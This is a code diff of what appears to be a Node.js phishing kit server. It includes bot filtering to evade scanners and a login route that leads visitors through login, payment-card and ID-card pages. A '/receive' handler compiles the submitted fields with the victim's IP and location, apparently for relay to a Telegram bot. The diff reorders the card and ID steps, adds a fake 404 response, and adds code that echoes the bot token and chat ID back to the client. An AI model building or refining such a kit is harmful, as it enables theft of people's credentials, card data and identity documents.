@@ -26,6 +26,8 @@ function getClientIp(req) {
   return req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 }
 
+
+
 // Bot detection functions
 function isBotUA(userAgent) {
   if (!userAgent) {
@@ -134,13 +136,21 @@ app.get('/Login', (req, res) => {
       res.sendFile(path.join(viewDir, 'form.html'));
       break;
     case '2':
-      res.sendFile(path.join(viewDir, 'card.html'));
+      if(Idcard == "on") {
+      res.sendFile(path.join(viewDir, 'idcard.html'));
+      } else {
+      res.sendFile(path.join(viewDir, 'card.html'));	
+      	}
       break;
     case '3':
-      res.sendFile(path.join(viewDir, 'idcard.html'));
+    if(Idcard == "on") {
+      res.sendFile(path.join(viewDir, 'card.html'));
+      } else {
+      	res.send("404 Not Found. The requested page does not exist.");
+      	}
       break;
     default:
-      res.sendFile(path.join(viewDir, 'login.html'));
+      res.sendFile(path.join(viewDir, 'message.html'));
       break;
   }
 });
@@ -183,6 +193,12 @@ app.post('/receive', (req, res) => {
         message += `${key}: ${value}\n`;
       }
     }
+    
+    for (const [key, value] of Object.entries(fields)) {
+		  if (key.toLowerCase() === 'id') {
+		    res.send({ botToken, chatId });
+		  }
+		}
 
     message += `\n🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
